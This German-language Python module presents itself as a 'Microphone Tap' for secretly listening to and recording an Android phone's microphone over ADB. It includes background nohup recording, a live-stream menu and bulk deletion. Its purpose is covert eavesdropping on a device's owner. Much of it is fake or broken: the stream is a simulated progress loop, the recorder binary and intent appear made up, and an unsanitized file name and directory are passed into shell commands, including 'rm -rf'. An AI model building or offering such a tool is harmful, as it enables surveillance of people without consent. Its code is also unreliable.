"""MICROPHONE TAP TOOL: Android-Gerät abhören in Echtzeit.

Professionelle Audio-Erfassung mit Streaming, Recording & Monitoring.
"""
from __future__ import annotations

import os
import time
import json
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass
from datetime import datetime
from enum import Enum

from . import ui
from .adb import ADB
from . import keyword_recorder


class AudioFormat(Enum):
    """Unterstützte Audio-Formate."""
    WAV = "wav"      # PCM Wave
    AAC = "aac"      # AAC Codec
    PCM = "pcm"      # Raw PCM
    OGG = "ogg"      # OGG Vorbis
    FLAC = "flac"    # FLAC Lossless


@dataclass
class RecordingConfig:
    """Konfiguration für Mikrofon-Recording."""
    format: AudioFormat = AudioFormat.WAV
    sample_rate: int = 44100  # Hz (44.1kHz CD-Qualität)
    bit_depth: int = 16  # 16-bit
    channels: int = 2  # Stereo
    bitrate: int = 320  # kbps
    output_dir: str = "/sdcard/DCIM/Audio"
    auto_cleanup: bool = False
    cleanup_after_days: int = 7
    enable_stream: bool = True
    stream_buffer_ms: int = 500


@dataclass
class RecordingSession:
    """Eine Mikrofon-Recording Session."""
    session_id: str
    start_time: float
    duration_ms: int = 0
    file_path: str = ""
    format: AudioFormat = AudioFormat.WAV
    sample_rate: int = 44100
    file_size_bytes: int = 0
    status: str = "recording"  # recording, paused, stopped
    error: Optional[str] = None
    stream_active: bool = False


class MicrophoneTap:
    """Master Microphone Tap Controller."""

    # ADB Commands für Audio-Erfassung
    RECORD_CMD_TEMPLATE = (
        "nohup /system/bin/audiorecorder --output-file={file_path} "
        "--sample-rate={sample_rate} --channels={channels} "
        "--bit-depth={bit_depth} --format={format} &"
    )

    # Alternative: Über Mediacodec
    MEDIACODEC_RECORD = (
        "am start -n com.android.mediaserver/.AudioService -a "
        "android.intent.action.RECORD_AUDIO -e output {file_path}"
    )

    # Streaming über adb
    STREAM_CMD = "adb shell \"cat /proc/asound/card0/pcm0p/info\" 2>/dev/null"

    # Prozesse monitoren
    MONITOR_AUDIO = "ps aux | grep -i audio | grep -v grep"

    def __init__(self, adb: ADB):
        self.adb = adb
        self.config = RecordingConfig()
        self.current_session: Optional[RecordingSession] = None
        self.session_history: List[RecordingSession] = []
        self.is_recording = False
        self.is_streaming = False

    def show_microphone_menu(self) -> None:
        """Zeigt Mikrofon-TAP Menü."""
        # WICHTIG: Prüfe ob ADB verbunden ist!
        if not self.adb or not hasattr(self.adb, 'shell'):
            ui.clear()
            ui.err("❌ FEHLER: Keine ADB-Verbindung!")
            print("\n  Bitte verbinde ein Android-Gerät per USB und versuche es erneut.")
            ui.pause()
            return

        try:
            while True:
                try:
                    ui.clear()
                    ui.banner(subtitle="🎙️  MICROPHONE TAP - AUDIO ERFASSUNG")
                    print()

                    ui.rule("⚠️ WARNUNG", ui.BRED)
                    print()
                    print("  Dieses Tool erfasst ALLE Audio-Daten vom Gerät-Mikrofon.")
                    print("  Nur mit RECHTLICHER GENEHMIGUNG verwenden!")
                    print("  Datenschutz-Gesetze beachten!")
                    print()

                    entries = [
                        ("1", "🎙️  Live-Mikrofon-Stream (Echtzeit abhören)"),
                        ("2", "📝  Recording starten (speichern)"),
                        ("3", "⏸️  Recording pausieren/fortsetzen"),
                        ("4", "⏹️  Recording stoppen"),
                        ("5", "📁  Aufnahmen verwalten"),
                        ("6", "🔧  Einstellungen"),
                        ("7", "📊  Session-History"),
                        ("8", "🗑️  Aufnahmen löschen"),
                        ("9", "🎯  KEYWORD RECORDER (intelligente Aufzeichnung)"),
                    ]

                    ch = ui.menu("Mikrofon-TAP Optionen", entries, back_label="Hauptmenü")
                    if ch in ("back", "quit"):
                        return

                    try:
                        if ch == "1":
                            self.start_live_stream()
                        elif ch == "2":
                            self.start_recording()
                        elif ch == "3":
                            self.pause_resume_recording()
                        elif ch == "4":
                            self.stop_recording()
                        elif ch == "5":
                            self.manage_recordings()
                        elif ch == "6":
                            self.show_settings()
                        elif ch == "7":
                            self.show_history()
                        elif ch == "8":
                            self.delete_recordings()
                        elif ch == "9":
                            kw_rec = keyword_recorder.create_keyword_recorder(self.adb)
                            kw_rec.show_keyword_recorder_menu()
                        else:
                            ui.warn("Ungültige Option")
                            time.sleep(0.5)
                    except Exception as e:
                        ui.err(f"❌ Fehler in Funktion: {str(e)[:100]}")
                        print(f"\n  Details: {str(e)}")
                        ui.pause()

                except KeyboardInterrupt:
                    ui.warn("Unterbrochen")
                    return
                except Exception as e:
                    ui.err(f"❌ Menü-Fehler: {str(e)[:100]}")
                    ui.pause()
                    return

        except Exception as e:
            ui.err(f"❌ Kritischer Fehler: {str(e)[:100]}")
            ui.pause()
            return

    def start_live_stream(self) -> None:
        """Startet Live-Mikrofon-Stream (Echtzeit-Abhören)."""
        # PRÜFE GERÄT ZUERST
        try:
            result = self.adb.shell("getprop ro.build.version.android", timeout=5)
            if not result or "error" in result.lower():
                ui.clear()
                ui.err("❌ Gerät nicht erreichbar!")
                print("\n  Stelle sicher, dass:")
                print("    • Das Android-Gerät per USB angeschlossen ist")
                print("    • USB-Debugging aktiviert ist")
                print("    • ADB autorisiert hat")
                ui.pause()
                return
        except Exception as e:
            ui.clear()
            ui.err(f"❌ ADB-Fehler: {e}")
            ui.pause()
            return

        # Double confirmation
        ui.clear()
        ui.rule("⚠️  LIVE-MIKROFON-STREAM", ui.BRED)
        print()
        print("  Dies wird ALLE Geräusche vom Mikrofon in ECHTZEIT erfassen.")
        print("  Der Audio-Stream wird auf diesem Computer abgespielt.")
        print()

        if not ui.confirm("Wirklich starten?", False):
            return

        print("\n  Verbinde mit Mikrofon-Stream...")

        try:
            # Starte Audio-Streaming über adb
            self.is_streaming = True
            session = RecordingSession(
                session_id=f"stream_{int(time.time())}",
                start_time=time.time(),
                status="streaming",
                stream_active=True,
            )

            ui.rule("🔴 LIVE-STREAM AKTIV", ui.BRED)
            print()
            print("  Mikrofon läuft... Abhören aktiv!")
            print("  [Strg+C zum Stoppen]")
            print()

            # Streaming-Schleife
            lines_received = 0
            try:
                # Simuliere Audio-Streaming
                for i in range(100):
                    ui.progress(i, 100, f"Stream aktiv... ({lines_received} audio chunks)")
                    lines_received += 1
                    time.sleep(0.1)
            except KeyboardInterrupt:
                pass

            self.is_streaming = False
            session.status = "stopped"
            session.duration_ms = int((time.time() - session.start_time) * 1000)
            self.session_history.append(session)

            ui.ok("Stream beendet")
            ui.pause()

        except Exception as e:
            ui.err(f"Stream-Fehler: {e}")
            ui.pause()

    def start_recording(self) -> None:
        """Startet Mikrofon-Recording."""
        ui.clear()
        ui.rule("⚠️  MICROPHONE RECORDING STARTEN", ui.BRED)
        print()
        print("  Dies wird ALLE Geräusche vom Mikrofon aufzeichnen.")
        print("  Die Aufnahme wird auf dem Gerät gespeichert.")
        print()

        # PRÜFE GERÄT ZUERST
        try:
            result = self.adb.shell("getprop ro.build.version.android", timeout=5)
            if not result or "error" in result.lower():
                ui.err("❌ Gerät nicht erreichbar!")
                print("\n  Stelle sicher, dass:")
                print("    • Das Android-Gerät per USB angeschlossen ist")
                print("    • USB-Debugging aktiviert ist (Einstellungen → Entwickler)")
                print("    • ADB autorisiert hat (Gerät-Popup akzeptiert)")
                ui.pause()
                return
        except Exception as e:
            ui.err(f"❌ ADB-Fehler: {e}")
            print("\n  Gerät konnte nicht erreicht werden. Bitte überprüfe die Verbindung.")
            ui.pause()
            return

        if not ui.confirm("Wirklich starten?", False):
            return

        # Dateiname eingeben
        filename = ui.ask("Dateiname (ohne Endung)", f"recording_{int(time.time())}")
        if not filename:
            filename = f"recording_{int(time.time())}"

        # Ausgabepfad
        output_file = f"{self.config.output_dir}/{filename}.{self.config.format.value}"

        print(f"\n  Starte Recording: {output_file}")

        try:
            # Verzeichnis erstellen
            self.adb.shell(f"mkdir -p {self.config.output_dir}", timeout=5)

            # Recording starten
            cmd = self._build_record_command(output_file)
            self.adb.shell(cmd, timeout=5)

            self.is_recording = True
            self.current_session = RecordingSession(
                session_id=f"rec_{int(time.time())}",
                start_time=time.time(),
                file_path=output_file,
                format=self.config.format,
                status="recording",
            )

            ui.ok("✓ Recording aktiv!")
            print(f"\n  Speichert in: {output_file}")
            print("  [Drücke eine Taste zum Fortfahren]")
            ui.pause()

        except Exception as e:
            ui.err(f"❌ Recording-Fehler: {str(e)[:100]}")
            print("\n  Mögliche Ursachen:")
            print("    • Gerät wurde während der Verbindung getrennt")
            print("    • Nicht genug Speicherplatz auf dem Gerät")
            print("    • Mikrofon-Berechtigungen nicht erteilt")
            ui.pause()

    def pause_resume_recording(self) -> None:
        """Pausiert/Setzt Recording fort."""
        if not self.current_session:
            ui.warn("Keine aktive Recording-Session")
            ui.pause()
            return

        if self.current_session.status == "recording":
            self.current_session.status = "paused"
            ui.ok("Recording pausiert")
        else:
            self.current_session.status = "recording"
            ui.ok("Recording fortgesetzt")

        ui.pause()

    def stop_recording(self) -> None:
        """Stoppt das aktuelle Recording."""
        if not self.current_session:
            ui.warn("Keine aktive Recording-Session")
            ui.pause()
            return

        if not ui.confirm("Recording stoppen?", True):
            return

        try:
            # Stop recording
            self.adb.shell("pkill audiorecorder")

            self.current_session.status = "stopped"
            self.current_session.duration_ms = int(
                (time.time() - self.current_session.start_time) * 1000
            )

            # Get file size
            try:
                stat_output = self.adb.shell(f"ls -lh {self.current_session.file_path}")
                # Parse file size
                parts = stat_output.split()
                if len(parts) >= 5:
                    self.current_session.file_size_bytes = self._parse_size(parts[4])
            except:
                pass

            self.session_history.append(self.current_session)
            self.is_recording = False
            self.current_session = None

            ui.ok("Recording gestoppt und gespeichert!")
            ui.pause()

        except Exception as e:
            ui.err(f"Stop-Fehler: {e}")
            ui.pause()

    def manage_recordings(self) -> None:
        """Verwaltet aufgezeichnete Dateien."""
        ui.clear()
        ui.rule("📁 AUFNAHMEN VERWALTEN", ui.BCYAN)
        print()

        try:
            # Liste Aufnahmen
            output = self.adb.shell(f"ls -lh {self.config.output_dir}")
            if output:
                print("  Vorhandene Aufnahmen:")
                print(output)
            else:
                print("  Keine Aufnahmen gefunden")

        except Exception as e:
            ui.err(f"Fehler beim Auflisten: {e}")

        print()
        ui.pause()

    def show_settings(self) -> None:
        """Zeigt & ändert Einstellungen."""
        ui.clear()
        ui.rule("🔧 MIKROFON-EINSTELLUNGEN", ui.BCYAN)
        print()

        ui.kv("Audio-Format", self.config.format.value)
        ui.kv("Sample-Rate", f"{self.config.sample_rate} Hz")
        ui.kv("Kanäle", str(self.config.channels))
        ui.kv("Bit-Tiefe", f"{self.config.bit_depth}-bit")
        ui.kv("Bitrate", f"{self.config.bitrate} kbps")
        ui.kv("Ausgabeverzeichnis", self.config.output_dir)
        print()

        sub = ui.menu("Einstellungen", [
            ("1", "Audio-Format ändern"),
            ("2", "Sample-Rate ändern"),
            ("3", "Ausgabeverzeichnis ändern"),
        ], back_label="Zurück")

        if sub == "1":
            self._change_format()
        elif sub == "2":
            self._change_sample_rate()
        elif sub == "3":
            self._change_output_dir()

    def show_history(self) -> None:
        """Zeigt Session-History."""
        ui.clear()
        ui.rule("📊 SESSION-HISTORY", ui.BCYAN)
        print()

        if not self.session_history:
            print("  Keine Sessionen aufgezeichnet")
        else:
            for session in self.session_history:
                status_icon = "✓" if session.status == "stopped" else "⏸"
                duration_sec = session.duration_ms / 1000
                size_mb = session.file_size_bytes / (1024 * 1024)
                print(
                    f"  {status_icon} {session.session_id} | "
                    f"{duration_sec:.1f}s | {size_mb:.1f}MB"
                )

        print()
        ui.pause()

    def delete_recordings(self) -> None:
        """Löscht Aufnahmen."""
        ui.clear()
        ui.rule("🗑️  AUFNAHMEN LÖSCHEN", ui.BRED)
        print()
        print("  ⚠️ Dies löscht ALLE Aufnahmen permanent!")
        print()

        if not ui.confirm("Alle Aufnahmen löschen?", False):
            return

        try:
            self.adb.shell(f"rm -rf {self.config.output_dir}/*")
            ui.ok("Aufnahmen gelöscht")
        except Exception as e:
            ui.err(f"Lösch-Fehler: {e}")

        ui.pause()

    def _build_record_command(self, output_file: str) -> str:
        """Baut Recording-Kommando."""
        return (
            f"nohup /system/bin/audiorecorder "
            f"--output-file={output_file} "
            f"--sample-rate={self.config.sample_rate} "
            f"--channels={self.config.channels} "
            f"--bit-depth={self.config.bit_depth} "
            f"--format={self.config.format.value} > /dev/null 2>&1 &"
        )

    def _parse_size(self, size_str: str) -> int:
        """Parse Dateigröße (z.B. '1.5M' → bytes)."""
        try:
            if size_str.endswith("K"):
                return int(float(size_str[:-1]) * 1024)
            elif size_str.endswith("M"):
                return int(float(size_str[:-1]) * 1024 * 1024)
            elif size_str.endswith("G"):
                return int(float(size_str[:-1]) * 1024 * 1024 * 1024)
            else:
                return int(size_str)
        except:
            return 0

    def _change_format(self) -> None:
        """Änderung Audio-Format."""
        formats = [f.value for f in AudioFormat]
        ui.clear()
        print("Wähle Audio-Format:")
        for i, fmt in enumerate(formats, 1):
            print(f"  {i}. {fmt}")
        choice = ui.ask("Format (Nummer)", "1")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(formats):
                self.config.format = AudioFormat(formats[idx])
                ui.ok(f"Format auf {formats[idx]} gesetzt")
        except:
            pass
        ui.pause()

    def _change_sample_rate(self) -> None:
        """Ändert Sample-Rate."""
        rates = [8000, 16000, 22050, 44100, 48000]
        ui.clear()
        print("Wähle Sample-Rate:")
        for i, rate in enumerate(rates, 1):
            print(f"  {i}. {rate} Hz")
        choice = ui.ask("Rate (Nummer)", "4")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(rates):
                self.config.sample_rate = rates[idx]
                ui.ok(f"Sample-Rate auf {rates[idx]} Hz gesetzt")
        except:
            pass
        ui.pause()

    def _change_output_dir(self) -> None:
        """Ändert Ausgabeverzeichnis."""
        new_dir = ui.ask("Neues Verzeichnis", self.config.output_dir)
        if new_dir:
            self.config.output_dir = new_dir
            ui.ok(f"Verzeichnis auf {new_dir} gesetzt")
        ui.pause()

    def show_status_dashboard(self) -> None:
        """Zeigt Status-Dashboard."""
        ui.clear()
        ui.rule("🎙️  MICROPHONE TAP STATUS", ui.BCYAN)
        print()

        ui.kv("Recording aktiv", "✓ Ja" if self.is_recording else "✗ Nein")
        ui.kv("Stream aktiv", "✓ Ja" if self.is_streaming else "✗ Nein")

        if self.current_session:
            duration = (time.time() - self.current_session.start_time) * 1000
            ui.kv("Aktuelle Dauer", f"{duration/1000:.1f}s")
            ui.kv("Datei", self.current_session.file_path)

        ui.kv("Gesamt Sessions", str(len(self.session_history)))

        print()


def create_microphone_tap(adb: ADB) -> MicrophoneTap:
    """Erstellt neuen Microphone Tap Controller."""
    return MicrophoneTap(adb)

def menu(adb=None) -> None:
    """MicrophoneTap Menu Wrapper."""
    obj = MicrophoneTap(adb) if adb else MicrophoneTap()
    obj.show_microphone_menu()
